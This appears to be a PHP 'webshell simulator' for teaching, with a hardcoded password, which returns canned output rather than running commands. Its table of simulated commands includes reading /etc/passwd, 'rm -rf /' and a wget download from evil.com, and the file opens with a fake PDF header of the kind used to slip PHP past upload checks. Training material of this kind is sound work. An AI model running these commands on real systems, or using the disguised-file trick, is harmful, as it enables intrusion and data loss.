%PDF-1.5
<?php
// Activation du débogage pour afficher les erreurs (désactiver en production).
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Démarre la session pour gérer l'authentification et l'historique.
try {
    session_start();
    file_put_contents('debug.log', "Session démarrée à " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
} catch (Exception $e) {
    file_put_contents('debug.log', "Erreur session : " . $e->getMessage() . "\n", FILE_APPEND);
    die("Erreur : Vérifiez session.save_path dans php.ini. Détails dans debug.log.");
}

// Gestion du logout.
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: webshell_simulator.php');
    exit;
}

// Vérifie si l'utilisateur est authentifié.
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'];

// Initialise l'historique des commandes en session.
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}

// Gestion du formulaire de login.
if (!$authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    if ($password === 'hacker123') {
        $_SESSION['authenticated'] = true;
        file_put_contents('debug.log', "Connexion réussie à " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
        header('Location: webshell_simulator.php');
        exit;
    } else {
        $error = 'Mot de passe incorrect.';
        file_put_contents('debug.log', "Échec login avec '$password' à " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    }
}

// Gestion des actions du simulateur (si authentifié).
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = filter_input(INPUT_POST, 'action', FILTER_SANITIZE_STRING);
    $output = '';
    file_put_contents('debug.log', "Action '$action' exécutée à " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

    if ($action === 'cmd') {
        $command = filter_input(INPUT_POST, 'command', FILTER_SANITIZE_STRING);
        $simulated_responses = [
            'ls' => 'fichier1.txt fichier2.php dossier/ secret.conf — (Simulé : Liste de fichiers)',
            'whoami' => 'www-data — (Simulé : Utilisateur web)',
            'pwd' => '/var/www/html — (Simulé : Chemin courant)',
            'cat /etc/passwd' => 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin — (Simulé : Fuite de données)',
            'rm -rf /' => 'Opération destructive simulée — Système "effacé" (mais pas vraiment !)',
            'ifconfig' => 'eth0: 192.168.1.1 netmask 255.255.255.0 — (Simulé : Infos réseau)',
            'ps aux' => 'USER PID %CPU ... www-data 1234 0.1 ... — (Simulé : Processus en cours)',
            'wget http://evil.com' => 'Téléchargement simulé bloqué — (Simulé : Tentative de malware)',
        ];
        if (!empty($command)) {
            $output = $simulated_responses[$command] ?? "Commande inconnue : {$command} — Simulé : Échec.";
            $_SESSION['command_history'][] = ['command' => $command, 'output' => $output];
            file_put_contents('debug.log', "Commande '$command' exécutée à " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
        }
    } elseif ($action === 'upload') {
        $file_name = filter_input(INPUT_POST, 'file_name', FILTER_SANITIZE_STRING) ?? 'inconnu';
        $output = "Fichier '{$file_name}' uploadé (simulé) — Contenu non stocké.";
        $_SESSION['command_history'][] = ['command' => "Upload: $file_name", 'output' => $output];
    } elseif ($action === 'browse') {
        $dir = filter_input(INPUT_POST, 'dir', FILTER_SANITIZE_STRING) ?? '/';
        $output = "Contenu de {$dir} : fichier1, dossier2, config.ini — (Simulé : Navigation).";
        $_SESSION['command_history'][] = ['command' => "Browse: $dir", 'output' => $output];
    }

    echo "<pre>Action : {$action}\nRésultat simulé :\n{$output}</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Simulateur Webshell Pro Pédagogique</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        .container { max-width: 800px; margin: 0 auto; }
        .tabs { display: flex; justify-content: center; margin-bottom: 20px; }
        .tab { background: #111; color: #0f0; padding: 10px 20px; margin: 0 5px; cursor: pointer; border: 1px solid #0f0; border-radius: 5px; }
        .tab.active { background: #0f0; color: #000; }
        form { display: none; margin: 20px 0; }
        form.active { display: block; }
        input[type="text"], input[type="password"] { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 80%; border-radius: 3px; }
        input[type="submit"] { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; border-radius: 3px; }
        pre { background: #111; padding: 15px; border: 1px solid #0f0; border-radius: 5px; max-width: 100%; overflow-x: auto; animation: scanline 0.5s infinite; }
        @keyframes scanline { 0% { box-shadow: 0 0 10px #0f0; } 50% { box-shadow: 0 0 5px #0f0; } 100% { box-shadow: 0 0 10px #0f0; } }
        .glitch { animation: glitch 1s infinite; }
        @keyframes glitch { 0% { text-shadow: 0.05em 0 0 #f00, -0.05em 0 0 #0ff; } 50% { text-shadow: -0.05em 0 0 #f00, 0.05em 0 0 #0ff; } 100% { text-shadow: 0.05em 0 0 #f00, -0.05em 0 0 #0ff; } }
        .error { color: #f00; margin: 10px 0; }
        a { color: #f00; text-decoration: none; }
        .history { background: #111; padding: 10px; border: 1px solid #0f0; border-radius: 5px; margin-top: 20px; }
        .history h3 { margin: 0 0 10px; }
    </style>
    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('form').forEach(form => form.classList.remove('active'));
            document.getElementById(tabName + '-tab')?.classList.add('active');
            document.getElementById(tabName + '-form')?.classList.add('active');
        }
    </script>
</head>
<body>
    <div class="container">
        <?php if (!$authenticated) : ?>
            <h1 class="glitch">Accès Restreint : Simulateur Webshell Pro</h1>
            <p>Entrez le mot de passe pour accéder (Pédagogique seulement).</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Mot de passe" required>
                <input type="submit" value="Connexion">
            </form>
            <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
        <?php else : ?>
            <h1 class="glitch">Simulateur Webshell Pro (Éducatif)</h1>
            <p>Bienvenue ! Simulez des actions malveillantes pour apprendre à les détecter et prévenir.</p>
            
            <div class="tabs">
                <div id="cmd-tab" class="tab active" onclick="showTab('cmd')">Exécution Commandes</div>
                <div id="upload-tab" class="tab" onclick="showTab('upload')">Upload Fichier</div>
                <div id="browse-tab" class="tab" onclick="showTab('browse')">Navigation Répertoires</div>
            </div>
            
            <form id="cmd-form" class="active" method="POST">
                <input type="hidden" name="action" value="cmd">
                <input type="text" name="command" placeholder="Ex. : ls, whoami, rm -rf /" required>
                <input type="submit" value="Exécuter (Simulé)">
            </form>
            
            <form id="upload-form" method="POST">
                <input type="hidden" name="action" value="upload">
                <input type="text" name="file_name" placeholder="Nom du fichier à uploader (simulé)" required>
                <input type="submit" value="Uploader (Simulé)">
            </form>
            
            <form id="browse-form" method="POST">
                <input type="hidden" name="action" value="browse">
                <input type="text" name="dir" placeholder="Répertoire à explorer (ex. /etc)" required>
                <input type="submit" value="Explorer (Simulé)">
            </form>
            
            <?php if (!empty($_SESSION['command_history'])) : ?>
                <div class="history">
                    <h3>Historique des Actions</h3>
                    <?php foreach ($_SESSION['command_history'] as $entry) : ?>
                        <pre>Commande : <?php echo htmlspecialchars($entry['command']); ?>\nRésultat : <?php echo htmlspecialchars($entry['output']); ?></pre>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
            
            <p><a href="?logout">Déconnexion</a></p>
        <?php endif; ?>
        <p><strong>Avertissement :</strong> Outil pédagogique seulement. Consultez debug.log pour les logs.</p>
    </div>
</body>
</html>